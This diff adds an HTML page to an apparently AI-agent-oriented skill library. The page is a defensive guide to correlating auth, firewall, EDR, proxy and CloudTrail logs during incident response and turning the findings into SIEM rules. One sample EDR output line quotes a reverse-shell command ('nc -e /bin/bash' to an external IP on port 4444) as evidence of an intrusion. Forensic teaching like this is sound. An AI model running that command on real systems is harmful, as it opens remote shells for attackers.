@@ -1,0 +1,253 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AgentArsenal: incident-timeline-analysis-log-correlation</title>
+<style>
+:root {
+  --bg: #0d1117;
+  --panel: #161b22;
+  --border: #30363d;
+  --text: #e6edf3;
+  --muted: #8b949e;
+  --accent: #58a6ff;
+  --green: #3fb950;
+  --yellow: #d29922;
+  --red: #f85149;
+}
+* { box-sizing: border-box; }
+body {
+  background: var(--bg);
+  color: var(--text);
+  font-family: system-ui, -apple-system, "Segoe UI", Roboto, sans-serif;
+  margin: 0;
+  line-height: 1.6;
+}
+.wrap { max-width: 1100px; margin: 0 auto; padding: 1.5rem; }
+header.site {
+  border-bottom: 1px solid var(--border);
+  background: var(--panel);
+}
+header.site .wrap { display: flex; align-items: center; gap: 1.5rem; flex-wrap: wrap; }
+header.site h1 { font-size: 1.25rem; margin: 0; }
+header.site h1 a { color: var(--text); text-decoration: none; }
+nav a { color: var(--accent); text-decoration: none; margin-right: 1rem; }
+nav a:hover { text-decoration: underline; }
+table { width: 100%; border-collapse: collapse; margin-top: 1rem; }
+th, td { border: 1px solid var(--border); padding: 0.55rem 0.75rem; text-align: left; vertical-align: top; }
+th { background: var(--panel); }
+tbody tr:hover { background: rgba(88, 166, 255, 0.06); }
+a { color: var(--accent); }
+.muted { color: var(--muted); }
+.badge {
+  display: inline-block;
+  padding: 0.12rem 0.6rem;
+  border-radius: 999px;
+  font-size: 0.8rem;
+  font-weight: 600;
+  white-space: nowrap;
+}
+.badge.green { background: rgba(63, 185, 80, 0.12); color: var(--green); border: 1px solid var(--green); }
+.badge.yellow { background: rgba(210, 153, 34, 0.12); color: var(--yellow); border: 1px solid var(--yellow); }
+.badge.red { background: rgba(248, 81, 73, 0.12); color: var(--red); border: 1px solid var(--red); }
+.badge.gray { background: rgba(139, 148, 158, 0.12); color: var(--muted); border: 1px solid var(--muted); }
+#filter {
+  width: 100%;
+  max-width: 28rem;
+  padding: 0.6rem 0.8rem;
+  margin-top: 1rem;
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  color: var(--text);
+  font-size: 1rem;
+}
+pre {
+  background: var(--panel);
+  border: 1px solid var(--border);
+  border-radius: 6px;
+  padding: 1rem;
+  overflow-x: auto;
+}
+code { font-family: ui-monospace, SFMono-Regular, Menlo, Consolas, monospace; font-size: 0.9em; }
+pre code { font-size: 0.85rem; }
+p code, li code, td code {
+  background: rgba(88, 166, 255, 0.1);
+  border: 1px solid var(--border);
+  border-radius: 4px;
+  padding: 0.05rem 0.35rem;
+}
+.meta { display: flex; gap: 0.75rem; flex-wrap: wrap; margin: 1rem 0; align-items: center; }
+.deps { margin: 0.5rem 0; }
+.deps span.kind { color: var(--muted); font-size: 0.85rem; margin-right: 0.4rem; }
+.deps a { margin-right: 0.5rem; }
+h2 { border-bottom: 1px solid var(--border); padding-bottom: 0.4rem; }
+footer { border-top: 1px solid var(--border); margin-top: 2rem; padding: 1rem 0; color: var(--muted); font-size: 0.85rem; }
+.legend { display: flex; gap: 1.5rem; flex-wrap: wrap; margin: 1rem 0; color: var(--muted); font-size: 0.9rem; }
+.legend svg { vertical-align: middle; margin-right: 0.4rem; }
+.graph-note { color: var(--muted); font-size: 0.9rem; }
+</style>
+</head>
+<body>
+<header class="site">
+<div class="wrap">
+<h1><a href="../index.html">AgentArsenal</a></h1>
+<nav>
+<a href="../index.html">Skills</a>
+<a href="../index.html#agents">Agents</a>
+<a href="../index.html#brains">Brains</a>
+<a href="../index.html#playbooks">Playbooks</a>
+<a href="../index.html#decisions">Decisions</a>
+<a href="../graph.html">Dependency graph</a>
+</nav>
+</div>
+</header>
+<main class="wrap">
+<p><a href="../index.html">&larr; All skills</a></p><h2>incident-timeline-analysis-log-correlation</h2><div class="meta"><span class="badge gray">incident</span><span class="muted">v1.0.0</span><span class="badge green">stable</span><span class="badge green">100/100</span><span class="muted">verified 2026-10-23</span></div><p>Use when you must join events across different log</p><div class="deps"><span class="kind">sub-skill of:</span> <a href="incident-timeline-analysis.html">incident-timeline-analysis</a></div><div class="deps"><span class="kind">requires:</span> <a href="incident-timeline-analysis.html">incident-timeline-analysis</a></div><div class="deps"><span class="kind">extends:</span> <span class="muted">none</span></div><div class="deps"><span class="kind">relates:</span> <a href="incident-timeline-analysis.html">incident-timeline-analysis</a></div><h2>Tools</h2><table><thead><tr><th>Tool</th><th>Version</th></tr></thead><tbody><tr><td>Python</td><td>3.12</td></tr><tr><td>jq</td><td>1.7</td></tr><tr><td>Wireshark</td><td>4.2</td></tr></tbody></table><p>Log correlation joins the &quot;who logged in&quot; with the &quot;what connected where&quot; and the &quot;which process did it&quot; across sources that never agreed on a format. It is the step that turns coincident timestamps into a causal chain. This sub-skill covers the join keys that work (time windows, IPs, usernames, process ids, session tokens), the normalization that makes joins possible, and the common correlation patterns for intrusion cases. Authorized systems only.</p>
+<h2>Quick Workflow</h2>
+<ol>
+<li>List the sources and their native timestamp formats; convert</li>
+<p>everything to UTC ISO.</p>
+<li>Pick join keys per source pair: time window plus IP, user,</li>
+<p>process, or session.</p>
+<li>Start with the highest-confidence joins (same IP within</li>
+<p>minutes, EDR parent-child).</p>
+<li>Build the chain outward: login to process to network to file.</li>
+<li>Verify each link independently; one weak link breaks the chain.</li>
+<li>Document the join logic so a reviewer can reproduce it.</li>
+<li>Promote repeated patterns to SIEM detection rules.</li>
+<li>Note what did not correlate; negative results bound the story.</li>
+</ol>
+<h2>1. Timestamp normalization</h2>
+<pre><code class="language-bash"># Syslog (no year, local time): add year and convert
+# &quot;Oct 21 03:12:44 web-03 sshd[1234]: Accepted ...&quot;
+python3 - &lt;&lt;&#x27;EOF&#x27;
+from datetime import datetime
+line = &quot;Oct 21 03:12:44 web-03 sshd[1234]: Accepted password for ops from 198.51.100.23&quot;
+ts = datetime.strptime(&quot;2026 &quot; + &quot; &quot;.join(line.split()[:3]), &quot;%Y %b %d %H:%M:%S&quot;)
+print(ts.isoformat() + &quot;Z&quot;)  # assume UTC per source inventory; adjust per host
+EOF
+
+# JSON logs with epoch: convert with jq
+jq -r &#x27;[.timestamp, .src_ip, .user] | @tsv&#x27; edr-events.json | head -5
+# If .timestamp is epoch seconds:
+jq -r &#x27;[(.timestamp | strftime(&quot;%Y-%m-%dT%H:%M:%SZ&quot;)), .src_ip, .user] | @tsv&#x27; edr.json</code></pre>
+<p>Record the conversion per source in the case file. A correlation built on unconverted timezones is fiction with citations.</p>
+<h2>2. Auth to network: the classic join</h2>
+<pre><code class="language-python"># auth-to-net.py: logins followed by suspicious outbound connections
+import re
+from datetime import datetime, timedelta
+
+logins = []
+for line in open(&#x27;auth.log&#x27;):
+    m = re.search(r&#x27;(\w{3}\s+\d+ \d+:\d+:\d+).*Accepted \w+ for (\w+) from ([\d.]+)&#x27;, line)
+    if m:
+        ts = datetime.strptime(f&quot;2026 {m.group(1)}&quot;, &quot;%Y %b %d %H:%M:%S&quot;)
+        logins.append((ts, m.group(2), m.group(3)))
+
+# Firewall log: ts, src, dst, dport (adapt to your format)
+for line in open(&#x27;firewall.log&#x27;):
+    p = line.split()
+    ts = datetime.strptime(p[0] + &#x27; &#x27; + p[1], &quot;%Y-%m-%d %H:%M:%S&quot;)
+    for login_ts, user, ip in logins:
+        delta = (ts - login_ts).total_seconds()
+        if p[2] == ip and 0 &lt; delta &lt; 900 and p[4] not in (&#x27;22&#x27;, &#x27;443&#x27;):
+            print(f&quot;{ts} {user}@{ip} -&gt; {p[3]}:{p[4]} ({delta:.0f}s after login)&quot;)</code></pre>
+<p>Example output shape:</p>
+<pre><code>2026-10-21 03:18:02 ops@198.51.100.23 -&gt; 198.51.100.23:4444 (318s after login)</code></pre>
+<p>An SSH login followed five minutes later by an outbound connection to a high port on the same external IP is the shape of a reverse shell or a staging channel. Verify with the EDR process data before calling it.</p>
+<h2>3. EDR process ancestry joins</h2>
+<pre><code class="language-bash"># Find the process that made the suspicious connection (EDR JSON)
+jq -r &#x27;select(.dst_ip == &quot;198.51.100.23&quot; and .dst_port == 4444) |
+  [.timestamp, .hostname, .process_name, .process_id, .parent_process_name] | @tsv&#x27; \
+  edr-net.json
+
+# Walk up the ancestry: who started that process
+jq -r &#x27;select(.process_id == 4242) |
+  [.timestamp, .process_name, .parent_process_name, .parent_process_id, .command_line] | @tsv&#x27; \
+  edr-process.json</code></pre>
+<p>Example output shape:</p>
+<pre><code>2026-10-21T03:18:02Z  web-03  nc  4242  sshd
+2026-10-21T03:17:55Z  nc  sshd  1234  &quot;nc -e /bin/bash 198.51.100.23 4444&quot;</code></pre>
+<p>The chain is now complete: sshd accepted the login, sshd spawned nc, nc connected out. Three sources, one story, each link independently verifiable. This is the standard of proof for the report.</p>
+<h2>4. Proxy to auth: user attribution for web traffic</h2>
+<pre><code class="language-python"># proxy-to-auth.py: attribute proxy requests to authenticated users
+# Proxy log: timestamp, src_ip, method, url; VPN log: timestamp, user, assigned_ip
+from datetime import datetime
+
+sessions = []  # (start, end, user, ip) from VPN logs
+for line in open(&#x27;vpn.log&#x27;):
+    # &quot;2026-10-21 03:10:00 CONNECT user=ops ip=10.8.0.14&quot;
+    p = dict(kv.split(&#x27;=&#x27;) for kv in line.split()[2:])
+    sessions.append((line[:19], p[&#x27;user&#x27;], p[&#x27;ip&#x27;]))
+
+for line in open(&#x27;proxy.log&#x27;):
+    ts, src, method, url = line.split()[:4]
+    for start, user, ip in sessions:
+        if src == ip and ts &gt;= start:
+            print(f&quot;{ts} {user} ({src}) {method} {url}&quot;)
+            break</code></pre>
+<p>DHCP and VPN reassignment mean IP-to-user mapping expires; always join on the lease window, never on a static IP-to-user table from last month.</p>
+<h2>5. Cloud trail correlation</h2>
+<pre><code class="language-bash"># Follow an assumed role through CloudTrail
+jq -r &#x27;select(.userIdentity.arn | contains(&quot;ops&quot;)) |
+  [.eventTime, .eventName, .sourceIPAddress, .userIdentity.type] | @tsv&#x27; \
+  cloudtrail.json | sort | head -20
+
+# Look for the classic sequence: GetSessionToken then unusual API calls
+jq -r &#x27;select(.eventName == &quot;AssumeRole&quot; or .eventName == &quot;GetSessionToken&quot;) |
+  [.eventTime, .requestParameters.roleArn, .sourceIPAddress] | @tsv&#x27; cloudtrail.json</code></pre>
+<p>Correlate the source IP with your VPN and auth logs: an AssumeRole from an IP that never appears in your VPN logs is an external caller with stolen credentials until proven otherwise.</p>
+<h2>6. From correlation to detection</h2>
+<p>Every verified correlation is a future SIEM rule. Write it while the case is fresh:</p>
+<pre><code>Rule: SSH login followed by outbound high-port connection (15 min window)
+Logic: auth Accepted for $user from $ip, then firewall ALLOW $ip -&gt; external:&gt;1024
+Tuning: exclude known admin jump hosts and backup destinations
+ATT&amp;CK: T1078 -&gt; T1048/T1059</code></pre>
+<p>Test the rule against 30 days of history before deploying: if it fires on normal admin work, tune the window or the port list, do not ship a noisy rule.</p>
+<h2>Edge cases</h2>
+<ul>
+<li>NAT hides the true source IP. Correlate on the NAT translation</li>
+<p>logs too, or the join attributes the wrong internal host.</p>
+<li>Clock skew between sources exceeds your join window. Measure and</li>
+<p>correct skew first (parent skill); widening the window instead just adds false joins.</p>
+<li>The attacker used the same credentials as legitimate admins.</li>
+<p>Distinguish by source IP, unusual hours, and tooling artifacts; the join keys must include something the attacker cannot fake as easily as a password.</p>
+<li>Log formats change mid-incident (agent upgrade). Parse</li>
+<p>defensively: match on multiple field patterns and log parse failures.</p>
+<li>Encrypted traffic gives you IPs and ports but no URLs. The</li>
+<p>correlation still works on metadata; note the content gap.</p>
+<li>High-volume sources drown the join (proxy logs at millions of</li>
+<p>lines). Pre-filter to the incident entities (IPs, users, hosts) before joining.</p>
+</ul>
+<h2>Escalation</h2>
+<ul>
+<li>A correlation implicates a production service account used by</li>
+<p>automation. Distinguish attacker use from automation by behavior (automation is periodic and predictable); involve the service owner before disabling anything.</p>
+<li>Joins suggest the attacker moved through a system with no logs</li>
+<p>at all. Escalate the visibility gap; the next host in the chain needs EDR or the investigation flies blind.</p>
+<li>Correlation output will support disciplinary action. Raise the</li>
+<p>evidence bar: each link independently verified, methodology documented, second reviewer on the chain.</p>
+<li>The pattern matches an ongoing campaign, not a single incident.</li>
+<p>Escalate to threat intel for campaign tracking; your SIEM rule becomes fleet-wide.</p>
+</ul>
+<h2>Detection and defender view</h2>
+<p>Correlation is what SIEMs are for, and every manual join in this sub-skill is a detection waiting to be automated. The defender investments are normalized timestamps everywhere (UTC, NTP), consistent entity identifiers across sources (same hostname in every log), and centralization so joins do not require scp-ing files between hosts. The maturity test: can your SOC run the auth-to-network join in under five minutes from the console. If not, the tooling, not the analysts, is the bottleneck.</p>
+<h2>Key references</h2>
+<ul>
+<li>Parent workflow: incident-timeline-analysis (this repo)</li>
+<li>Plaso and psort: https://plaso.readthedocs.io/</li>
+<li>MITRE ATT&amp;CK: https://attack.mitre.org/</li>
+<li>NIST SP 800-92 (log management):</li>
+<p>https://csrc.nist.gov/publications/detail/sp/800-92/final</p>
+<li>jq manual: https://jqlang.github.io/jq/manual/</li>
+<li>Elastic Common Schema (normalization reference):</li>
+<p>https://www.elastic.co/guide/en/ecs/current/index.html</p>
+</ul>
+</main>
+<footer class="wrap">
+<p>AgentArsenal docs. Generated 2026-10-23.</p>
+</footer>
+</body>
+</html>
